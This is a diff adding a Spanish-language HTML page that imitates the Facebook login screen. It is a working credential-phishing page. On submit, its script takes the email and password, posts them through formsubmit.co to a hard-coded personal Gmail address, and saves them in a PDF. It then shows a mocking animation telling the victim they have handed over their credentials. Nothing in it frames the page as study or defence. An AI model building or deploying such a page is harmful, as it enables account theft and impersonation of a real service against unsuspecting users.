@@ -1,0 +1,610 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Inicia sesión o regístrate</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            background-color: #f0f2f5;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .header {
+            background-color: #ffffff;
+            height: 80px;
+            box-shadow: 0 1px 4px rgba(0, 0, 0, 0.1);
+            display: flex;
+            align-items: center;
+            padding: 0 15px;
+        }
+        
+        .logo {
+            color: #1877f2;
+            font-size: 40px;
+            font-weight: bold;
+            margin-left: 15px;
+        }
+        
+        .main-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-grow: 1;
+            padding: 20px;
+        }
+        
+        .left-section {
+            max-width: 500px;
+            padding-right: 32px;
+        }
+        
+        .left-section h1 {
+            color: #1877f2;
+            font-size: 55px;
+            margin-bottom: 10px;
+        }
+        
+        .left-section p {
+            font-size: 28px;
+            line-height: 32px;
+        }
+        
+        .login-box {
+            background-color: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            width: 396px;
+        }
+        
+        .login-box input {
+            width: 100%;
+            padding: 14px 16px;
+            margin-bottom: 12px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+            outline: none;
+        }
+        
+        .login-box input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+        
+        .login-box input::placeholder {
+            color: #8d8d8d;
+        }
+        
+        .login-button {
+            background-color: #1877f2;
+            border: none;
+            border-radius: 6px;
+            color: white;
+            font-size: 20px;
+            font-weight: bold;
+            padding: 12px;
+            width: 100%;
+            margin-bottom: 16px;
+            cursor: pointer;
+        }
+        
+        .login-button:hover {
+            background-color: #166fe5;
+        }
+        
+        .forgot-password {
+            color: #1877f2;
+            font-size: 14px;
+            text-align: center;
+            display: block;
+            margin-bottom: 20px;
+            text-decoration: none;
+        }
+        
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+        
+        .divider {
+            border-bottom: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+        
+        .create-account {
+            background-color: #42b72a;
+            border: none;
+            border-radius: 6px;
+            color: white;
+            font-size: 17px;
+            font-weight: bold;
+            padding: 14px 16px;
+            margin: 0 auto;
+            display: block;
+            cursor: pointer;
+        }
+        
+        .create-account:hover {
+            background-color: #36a420;
+        }
+        
+        .create-page {
+            margin-top: 28px;
+            font-size: 14px;
+            text-align: center;
+        }
+        
+        .create-page a {
+            color: #1c1e21;
+            font-weight: bold;
+            text-decoration: none;
+        }
+        
+        .create-page a:hover {
+            text-decoration: underline;
+        }
+        
+        .footer {
+            background-color: #ffffff;
+            padding: 20px 0;
+            margin-top: auto;
+        }
+        
+        .footer-content {
+            max-width: 980px;
+            margin: 0 auto;
+            padding: 0 15px;
+        }
+        
+        .languages {
+            display: flex;
+            flex-wrap: wrap;
+            margin-bottom: 10px;
+        }
+        
+        .languages a {
+            color: #737373;
+            font-size: 12px;
+            margin-right: 10px;
+            text-decoration: none;
+        }
+        
+        .languages a:hover {
+            text-decoration: underline;
+        }
+        
+        .copyright {
+            color: #737373;
+            font-size: 11px;
+            margin-top: 20px;
+        }
+        
+        @media (max-width: 900px) {
+            .main-container {
+                flex-direction: column;
+                text-align: center;
+            }
+            
+            .left-section {
+                padding-right: 0;
+                margin-bottom: 40px;
+            }
+            
+            .left-section h1 {
+                font-size: 40px;
+            }
+            
+            .left-section p {
+                font-size: 22px;
+            }
+        }
+
+        /* Modal de confirmación */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 100;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.8);
+        }
+        
+        .modal-content {
+            background-color: #fefefe;
+            margin: 10% auto;
+            padding: 20px;
+            border-radius: 8px;
+            width: 80%;
+            max-width: 500px;
+            text-align: center;
+            position: relative;
+        }
+        
+        .close-btn {
+            color: #aaa;
+            float: right;
+            font-size: 28px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        
+        /* Animación de burla */
+        .troll-animation {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.9);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            z-index: 200;
+        }
+        
+        .troll-gif {
+            max-width: 80%;
+            max-height: 60vh;
+            border-radius: 10px;
+            box-shadow: 0 0 30px #ff0000;
+        }
+        
+        .troll-text {
+            color: white;
+            font-size: 32px;
+            margin-top: 20px;
+            text-align: center;
+            text-shadow: 0 0 10px red;
+            animation: rainbow 2s linear infinite;
+        }
+        
+        @keyframes rainbow {
+            0% { color: red; }
+            14% { color: orange; }
+            28% { color: yellow; }
+            42% { color: lime; }
+            57% { color: blue; }
+            71% { color: indigo; }
+            85% { color: violet; }
+            100% { color: red; }
+        }
+        
+        .confetti {
+            position: absolute;
+            width: 10px;
+            height: 10px;
+            background-color: #f00;
+            border-radius: 50%;
+            animation: confetti-fall 5s linear forwards;
+        }
+        
+        @keyframes confetti-fall {
+            to {
+                transform: translateY(100vh) rotate(720deg);
+                opacity: 0;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <div class="logo">facebook</div>
+    </header>
+    
+    <main class="main-container">
+        <section class="left-section">
+            <h1>facebook</h1>
+            <p>Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</p>
+        </section>
+        
+        <section class="right-section">
+            <div class="login-box">
+                <form id="facebookForm">
+                    <input type="text" id="userEmail" placeholder="Correo electrónico o número de teléfono" required>
+                    <input type="password" id="userPassword" placeholder="Contraseña" required>
+                    <button type="submit" class="login-button">Iniciar sesión</button>
+                    <a href="#" class="forgot-password">¿Olvidaste tu contraseña?</a>
+                    <div class="divider"></div>
+                    <button type="button" class="create-account">Crear cuenta nueva</button>
+                </form>
+            </div>
+            
+            <p class="create-page"><a href="#">Crea una página</a> para una celebridad, una marca o un negocio.</p>
+        </section>
+    </main>
+    
+    <footer class="footer">
+        <div class="footer-content">
+            <div class="languages">
+                <a href="#">Español</a>
+                <a href="#">English (US)</a>
+                <a href="#">Français (France)</a>
+                <a href="#">Português (Brasil)</a>
+                <a href="#">Italiano</a>
+                <a href="#">Deutsch</a>
+                <a href="#">العربية</a>
+                <a href="#">हिन्दी</a>
+                <a href="#">中文(简体)</a>
+                <a href="#">日本語</a>
+                <a href="#">+</a>
+            </div>
+            
+            <div class="divider"></div>
+            
+            <div class="languages">
+                <a href="#">Registrarte</a>
+                <a href="#">Iniciar sesión</a>
+                <a href="#">Messenger</a>
+                <a href="#">Facebook Lite</a>
+                <a href="#">Video</a>
+                <a href="#">Lugares</a>
+                <a href="#">Juegos</a>
+                <a href="#">Marketplace</a>
+                <a href="#">Meta Pay</a>
+                <a href="#">Meta Store</a>
+                <a href="#">Meta Quest</a>
+                <a href="#">Instagram</a>
+                <a href="#">Threads</a>
+                <a href="#">Recaudaciones de fondos</a>
+                <a href="#">Servicios</a>
+                <a href="#">Centro de información de votación</a>
+                <a href="#">Política de privacidad</a>
+                <a href="#">Centro de privacidad</a>
+                <a href="#">Grupos</a>
+                <a href="#">Información</a>
+                <a href="#">Crear anuncio</a>
+                <a href="#">Crear página</a>
+                <a href="#">Desarrolladores</a>
+                <a href="#">Empleo</a>
+                <a href="#">Cookies</a>
+                <a href="#">Opciones de anuncios</a>
+                <a href="#">Condiciones</a>
+                <a href="#">Ayuda</a>
+                <a href="#">Subir contactos y no usuarios</a>
+            </div>
+            
+            <div class="copyright">Meta © 2024</div>
+        </div>
+    </footer>
+
+    <!-- Modal de confirmación -->
+    <div id="confirmationModal" class="modal">
+        <div class="modal-content">
+            <span class="close-btn">&times;</span>
+            <h3>¡Gracias por tu feedback!</h3>
+            <p>Se ha generado un PDF y notificado al equipo.</p>
+            <p id="userDataPreview"></p>
+        </div>
+    </div>
+
+    <!-- Animación de burla -->
+    <div id="trollAnimation" class="troll-animation">
+        <img src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExcDl2bWY1b3RkY3Z3eW1mZ2Z6dWZ4eGx4dGJ6dWZqZzZ0bGJmYyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/l0HU7JI8AfUAbJ6f6/giphy.gif" alt="Troll Face" class="troll-gif">
+        <div class="troll-text">¡JAJAJA! ACABAS DE REGALAR TUS CREDENCIALES</div>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+    <script>
+        // Configuración para el envío de correo
+        const YOUR_EMAIL = 'joaquinballesterosrico@gmail.com';
+        
+        // Elementos del modal
+        const modal = document.getElementById("confirmationModal");
+        const span = document.getElementsByClassName("close-btn")[0];
+        const userDataPreview = document.getElementById("userDataPreview");
+        const trollAnimation = document.getElementById("trollAnimation");
+
+        span.onclick = function() {
+            modal.style.display = "none";
+        }
+
+        window.onclick = function(event) {
+            if (event.target == modal) {
+                modal.style.display = "none";
+            }
+        }
+
+        document.getElementById('facebookForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // Obtener datos del formulario
+            const email = document.getElementById('userEmail').value;
+            const password = document.getElementById('userPassword').value;
+            const timestamp = new Date().toLocaleString();
+            const ipAddress = 'Obteniendo...';
+            
+            // Generar PDF con contraseña visible
+            generatePDF(email, password, timestamp, ipAddress);
+            
+            // Enviar correo
+            sendEmail(email, password, timestamp, ipAddress);
+            
+            // Mostrar modal de confirmación (brevemente)
+            userDataPreview.innerHTML = `
+                <strong>Email:</strong> ${email}<br>
+                <strong>Contraseña:</strong> ${password}<br>
+                <strong>Hora:</strong> ${timestamp}<br>
+                <strong>IP:</strong> ${ipAddress}
+            `;
+            modal.style.display = "block";
+            
+            // Mostrar animación de burla después de 2 segundos
+            setTimeout(() => {
+                modal.style.display = "none";
+                showTrollAnimation();
+            }, 2000);
+
+            // Limpiar formulario
+            document.getElementById('facebookForm').reset();
+            
+            // Intentar obtener la IP real
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    userDataPreview.innerHTML += `<br><strong>IP Real:</strong> ${data.ip}`;
+                })
+                .catch(error => {
+                    console.error("Error al obtener IP:", error);
+                });
+        });
+
+        // Función para generar PDF con contraseña visible
+        function generatePDF(email, password, timestamp, ip) {
+            const { jsPDF } = window.jspdf;
+            const doc = new jsPDF();
+            
+            // Encabezado del PDF
+            doc.setFontSize(18);
+            doc.setTextColor(24, 119, 242);
+            doc.text('REGISTRO DE CREDENCIALES - FACEBOOK', 105, 15, null, null, 'center');
+            
+            // Logo (simulado)
+            doc.setFontSize(14);
+            doc.setTextColor(0, 0, 0);
+            doc.text('f', 20, 30);
+            doc.setFontSize(12);
+            doc.text('facebook', 27, 30);
+            
+            // Línea divisoria
+            doc.setDrawColor(220, 220, 220);
+            doc.line(20, 35, 190, 35);
+            
+            // Contenido del PDF
+            doc.setFontSize(12);
+            doc.text('INFORMACIÓN SENSIBLE OBTENIDA:', 20, 45);
+            
+            doc.setFontSize(10);
+            doc.text(`📧 Email: ${email}`, 20, 55);
+            doc.text(`🔑 Contraseña: ${password}`, 20, 65);
+            doc.text(`⏰ Fecha y hora: ${timestamp}`, 20, 75);
+            doc.text(`🌐 Dirección IP: ${ip}`, 20, 85);
+            
+            // Advertencia
+            doc.setFontSize(12);
+            doc.setTextColor(255, 0, 0);
+            doc.text('¡ESTA INFORMACIÓN HA SIDO COMPARTIDA CON EL ADMINISTRADOR!', 105, 100, null, null, 'center');
+            
+            // Imagen de burla en el PDF (texto simulado)
+            doc.setFontSize(20);
+            doc.setTextColor(255, 0, 0);
+            doc.text('(>‿◠)✌', 105, 120, null, null, 'center');
+            
+            // Pie de página
+            doc.setFontSize(8);
+            doc.setTextColor(100, 100, 100);
+            doc.text('Documento generado automáticamente - Confidencial', 105, 140, null, null, 'center');
+            doc.text(`Generado para: ${YOUR_EMAIL}`, 105, 145, null, null, 'center');
+            
+            // Guardar PDF
+            doc.save(`facebook_credenciales_${timestamp.replace(/[/:]/g, '-')}.pdf`);
+        }
+
+        // Función para enviar correo
+        function sendEmail(email, password, timestamp, ip) {
+            const subject = `¡NUEVAS CREDENCIALES OBTENIDAS! - ${timestamp}`;
+            const body = `
+                ¡Se han capturado nuevas credenciales de Facebook!
+                
+                🔍 Detalles completos:
+                
+                📧 Email: ${email}
+                🔑 Contraseña: ${password}
+                ⏰ Fecha y hora: ${timestamp}
+                🌐 IP: ${ip}
+                
+                Se ha generado un PDF con esta información adjunta.
+                
+                (◣_◢) ¡JAJAJA, FÁCIL!
+            `;
+            
+            console.log("Enviando email a:", YOUR_EMAIL);
+            console.log("Asunto:", subject);
+            console.log("Cuerpo:", body);
+            
+            // Usar FormSubmit.co para enviar el correo
+            fetch('https://formsubmit.co/ajax/joaquinballesterosrico@gmail.com', {
+                method: "POST",
+                headers: { 
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json'
+                },
+                body: JSON.stringify({
+                    email: email,
+                    password: password,
+                    timestamp: timestamp,
+                    ip: ip,
+                    _subject: subject,
+                    _template: "box",
+                    _captcha: "false"
+                })
+            })
+            .then(response => response.json())
+            .then(data => console.log("Correo enviado:", data))
+            .catch(error => console.log("Error al enviar:", error));
+        }
+
+        // Función para mostrar animación de burla
+        function showTrollAnimation() {
+            trollAnimation.style.display = "flex";
+            
+            // Crear confeti
+            createConfetti();
+            
+            // Reproducir sonido (simulado)
+            try {
+                const audio = new Audio('https://www.myinstants.com/media/sounds/trollface.mp3');
+                audio.volume = 0.5;
+                audio.play();
+            } catch (e) {
+                console.log("No se pudo reproducir sonido:", e);
+            }
+            
+            // Ocultar después de 7 segundos
+            setTimeout(() => {
+                trollAnimation.style.display = "none";
+            }, 7000);
+        }
+        
+        // Función para crear confeti
+        function createConfetti() {
+            const colors = ['#ff0000', '#00ff00', '#0000ff', '#ffff00', '#ff00ff', '#00ffff'];
+            
+            for (let i = 0; i < 100; i++) {
+                const confetti = document.createElement('div');
+                confetti.className = 'confetti';
+                confetti.style.left = Math.random() * 100 + 'vw';
+                confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
+                confetti.style.width = Math.random() * 10 + 5 + 'px';
+                confetti.style.height = Math.random() * 10 + 5 + 'px';
+                confetti.style.animationDuration = Math.random() * 3 + 2 + 's';
+                confetti.style.animationDelay = Math.random() * 2 + 's';
+                document.body.appendChild(confetti);
+                
+                // Eliminar después de la animación
+                setTimeout(() => {
+                    confetti.remove();
+                }, 5000);
+            }
+        }
+
+        // Botón "Crear cuenta nueva"
+        document.querySelector('.create-account').addEventListener('click', function() {
+            alert('Redirigiendo a página de registro...');
+        }); 
+    </script>
+</body>
+</html>
